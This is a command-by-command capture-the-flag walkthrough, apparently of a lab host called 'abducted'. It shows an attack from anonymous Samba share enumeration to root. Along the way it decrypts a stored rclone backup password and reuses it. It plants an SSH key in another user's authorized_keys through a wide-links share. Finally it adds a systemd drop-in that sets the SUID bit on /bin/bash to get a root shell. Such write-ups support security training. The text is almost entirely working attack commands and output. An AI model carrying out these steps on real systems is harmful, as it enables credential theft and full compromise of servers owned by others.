
└─$ nmap -p- -sSCV 10.129.244.177 --min-rate 999 
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
139/tcp open  netbios-ssn Samba smbd 4
445/tcp open  netbios-ssn Samba smbd 4


└─$ netexec smb 10.129.244.177 -u guest -p '' --shares
SMB         10.129.244.177  445    ABDUCTED         [*] Unix - Samba (name:ABDUCTED) (domain:ABDUCTED) (signing:False) (SMBv1:False)
SMB         10.129.244.177  445    ABDUCTED         [+] ABDUCTED\guest: (Guest)
SMB         10.129.244.177  445    ABDUCTED         [*] Enumerated shares
SMB         10.129.244.177  445    ABDUCTED         Share           Permissions     Remark
SMB         10.129.244.177  445    ABDUCTED         -----           -----------     ------
SMB         10.129.244.177  445    ABDUCTED         HP-Reception    WRITE           Reception printer
SMB         10.129.244.177  445    ABDUCTED         projects                        Hartley Group Project Files
SMB         10.129.244.177  445    ABDUCTED         transfer                        Staff file transfer
SMB         10.129.244.177  445    ABDUCTED         IPC$                            IPC Service (Hartley Group Document Services)

https://github.com/TheCyberGeek/CVE-2026-4480-PoC



nobody@abducted:/var/spool/samba$ find / -type f -name "*.conf" 2>/dev/null | grep -Ev "^/usr/|^/etc/"
<ame "*.conf" 2>/dev/null | grep -Ev "^/usr/|^/etc/"
/var/lib/ucf/cache/:etc:samba:smb.conf
/var/lib/ucf/cache/:etc:rsyslog.d:50-default.conf
/opt/offsite-backup/rclone.conf
/run/tmpfiles.d/static-nodes.conf
/run/systemd/resolve/resolv.conf
/run/systemd/resolve/stub-resolv.conf


nobody@abducted:/var/spool/samba$ cat /opt/offsite-backup/rclone.conf
cat /opt/offsite-backup/rclone.conf
[offsite]
type = sftp
host = backup.hartley-group.internal
user = svc-backup
pass = HZKAxfnMj-nLm59X9gpcC2ohjQL-WqVT6yRsNw
shell_type = unix

nobody@abducted:/var/spool/samba$ rclone reveal HZKAxfnMj-nLm59X9gpcC2ohjQL-WqVT6yRsNw
<clone reveal HZKAxfnMj-nLm59X9gpcC2ohjQL-WqVT6yRsNw
iXzvcib3SrpZ

nobody@abducted:/var/spool/samba$ cat /etc/passwd | grep bash
cat /etc/passwd | grep bash
root:x:0:0:root:/root:/bin/bash
scott:x:1000:1001:Scott Mercer:/home/scott:/bin/bash
marcus:x:1001:1002:Marcus Vale:/home/marcus:/bin/bash

scott@abducted:~$ id
uid=1000(scott) gid=1001(scott) groups=1001(scott)

scott@abducted:/var/log/sysstat$ find / -type f -name "*.conf" 2>/dev/null | grep -Ev "^/usr/|^/etc/"
/var/lib/ucf/cache/:etc:samba:smb.conf
/var/lib/ucf/cache/:etc:rsyslog.d:50-default.conf
/opt/offsite-backup/rclone.conf
/run/tmpfiles.d/static-nodes.conf
/run/systemd/resolve/resolv.conf
/run/systemd/resolve/stub-resolv.conf

scott@abducted:/var/log/sysstat$ ls -la /etc/samba/smb.conf
-rw-r--r-- 1 root root 361 Apr 22  2025 /etc/samba/smb.conf
scott@abducted:/var/log/sysstat$ cat /etc/samba/smb.conf
[global]
   workgroup = WORKGROUP
   server string = Hartley Group Document Services
   netbios name = ABDUCTED
   map to guest = Bad User
   guest account = nobody
   security = user
   printing = sysv
   load printers = no
   disable spoolss = no
   unix extensions = no
   allow insecure wide links = yes
   log level = 0
   include = /etc/samba/shares.conf

scott@abducted:/var/log/sysstat$ cat /etc/samba/shares.conf
[HP-Reception]
   comment = Reception printer
   path = /var/spool/samba
   printable = yes
   guest ok = yes
   print command = /usr/local/bin/printaudit %J %s
   lpq command = /bin/true
   lprm command = /bin/true

[projects]
   comment = Hartley Group Project Files
   path = /srv/projects
   valid users = scott
   read only = no
   browseable = yes

[transfer]
   comment = Staff file transfer
   path = /srv/transfer
   valid users = scott
   force user = marcus
   read only = no
   wide links = yes
   browseable = yes

scott@abducted:/var/log/sysstat$ ls -la /srv
total 16
drwxr-xr-x  4 root  root  4096 Mar 31  2025 .
drwxr-xr-x 23 root  root  4096 Jun  4 13:41 ..
drwxr-x---  2 scott scott 4096 Oct  9  2025 projects
drwxr-xr-x  2 scott scott 4096 Oct  9  2025 transfer


└─$ netexec smb 10.129.244.177 -u scott -p iXzvcib3SrpZ --shares
SMB         10.129.244.177  445    ABDUCTED         [*] Unix - Samba (name:ABDUCTED) (domain:ABDUCTED) (signing:False) (SMBv1:False)
SMB         10.129.244.177  445    ABDUCTED         [+] ABDUCTED\scott:iXzvcib3SrpZ 
SMB         10.129.244.177  445    ABDUCTED         [*] Enumerated shares
SMB         10.129.244.177  445    ABDUCTED         Share           Permissions     Remark
SMB         10.129.244.177  445    ABDUCTED         -----           -----------     ------
SMB         10.129.244.177  445    ABDUCTED         HP-Reception    WRITE           Reception printer
SMB         10.129.244.177  445    ABDUCTED         projects        READ,WRITE      Hartley Group Project Files
SMB         10.129.244.177  445    ABDUCTED         transfer        READ            Staff file transfer
SMB         10.129.244.177  445    ABDUCTED         IPC$                            IPC Service (Hartley Group Document Services)
                              

└─$ ssh-keygen -t rsa                                            
Generating public/private rsa key pair.
Enter file in which to save the key (/home/ed/.ssh/id_rsa): /tmp/id
Enter passphrase for "/tmp/id" (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /tmp/id
Your public key has been saved in /tmp/id.pub
The key fingerprint is:
SHA256:gWxkTtA8f305KpGGd/MEKXtSA261sm8/GRW8tjbtlw0 ed@kali
The key's randomart image is:
+---[RSA 3072]----+
|    .++   .....  |
|     *+. ...=. o |
|      =o..+*.o .o|
|     .  ooOo= =o.|
|        S+.= *.oo|
|          ... E+.|
|           .o .=+|
|           . .o.+|
|              ...|
+----[SHA256]-----+

─$ smbclient //10.129.244.177/transfer   -U 'scott%iXzvcib3SrpZ'
Try "help" to get a list of possible commands.
smb: \> cd marcus\
smb: \marcus\> ls
  .                                   D        0  Sat Jul 18 08:57:48 2026
  ..                                  D        0  Thu Jun  4 09:41:30 2026
  .profile                            H      807  Sun Mar 31 04:41:03 2024
  .bash_logout                        H      220  Sun Mar 31 04:41:03 2024
  .ssh                               DH        0  Sat Jul 18 08:57:48 2026
  .bash_history                       H        0  Thu Jun  4 09:47:57 2026
  .bashrc                             H     3771  Sun Mar 31 04:41:03 2024
  .cache                             DH        0  Thu Jun  4 09:41:30 2026

		5768764 blocks of size 1024. 2297256 blocks available
smb: \marcus\> cd .ssh
smb: \marcus\.ssh\> put id.pub authorized_keys
putting file id.pub as \marcus\.ssh\authorized_keys (2.3 kB/s) (average 2.3 kB/s)
smb: \marcus\.ssh\> ls
  .                                   D        0  Sat Jul 18 08:58:47 2026
  ..                                  D        0  Sat Jul 18 08:57:48 2026
  authorized_keys                     A      561  Sat Jul 18 08:58:47 2026



marcus@abducted:~$ id
uid=1001(marcus) gid=1002(marcus) groups=1002(marcus),1000(operators)

marcus@abducted:~$ find / -group operators 2>/dev/null
/etc/systemd/system/smbd.service.d


marcus@abducted:/etc/systemd/system/smbd.service.d$ cat exp.conf 
[Service]
ExecStartPre=/bin/bash -c 'chmod +s /bin/bash'


marcus@abducted:/etc/systemd/system/smbd.service.d$ systemctl daemon-reload
marcus@abducted:/etc/systemd/system/smbd.service.d$ systemctl restart smbd


scott@abducted:/var/log/sysstat$ ls -la /bin/bash
-rwsr-sr-x 1 root root 1446024 Mar 31  2024 /bin/bash
scott@abducted:/var/log/sysstat$ bash -p
bash-5.2# id
uid=1000(scott) gid=1001(scott) euid=0(root) egid=0(root) groups=0(root),1001(scott)
